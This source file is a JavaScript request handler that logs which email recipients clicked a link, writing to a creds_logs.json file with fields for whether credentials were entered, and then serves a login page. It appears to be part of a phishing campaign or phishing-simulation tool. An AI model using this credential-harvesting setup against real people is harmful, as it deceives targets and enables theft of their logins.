import fs from 'fs';
import path from 'path';

const __dirname = path.resolve();
const logsFile = path.join(__dirname, './creds_logs.json');

const emailClicked = (req, res) => {
    const email = req.query.email;

    if (!email) {
        console.warn('⚠️ Click without email param!');
        return res.status(400).send('Missing email param.');
    }

    console.log('🔗 Click by:', email);

    let logs = [];

    // Load file if exists
    try {
        if (fs.existsSync(logsFile)) {
            const raw = fs.readFileSync(logsFile, 'utf8').trim();

            if (raw) {
                const jsonData = JSON.parse(raw);
                if (Array.isArray(jsonData)) {
                    logs = jsonData;
                } else {
                    console.warn('⚠️ Invalid JSON format — resetting logs to []');
                }
            } else {
                console.warn('⚠️ Log file is empty — resetting logs to []');
            }
        } else {
            console.log('📁 creds_logs.json not found — creating new.');
        }
    } catch (err) {
        console.error('❌ Error reading logs:', err.message);
    }

    if (logs.length === 0) {
        logs.push([]);
    }

    const latestRun = logs[logs.length - 1];
    const index = latestRun.findIndex(entry => entry.email === email);

    if (index >= 0) {
        latestRun[index].Clicked = true;
        console.log(`✅ Updated Clicked=true for ${email} in latest run`);
    } else {
        const newEntry = {
            email: email,
            Clicked: true,
            credentailsEntered: false,
            details: {}
        };
        latestRun.push(newEntry);
        console.log(`✅ Added new entry for ${email} in latest run`);
    }

    // Save back to file
    try {
        fs.writeFileSync(logsFile, JSON.stringify(logs, null, 2), 'utf8');
        console.log('💾 Logs saved.');
    } catch (err) {
        console.error('❌ Error writing logs:', err.message);
    }

    // Show login page
    res.sendFile(path.join(__dirname, 'pages', 'login.html'));
};

export default emailClicked;
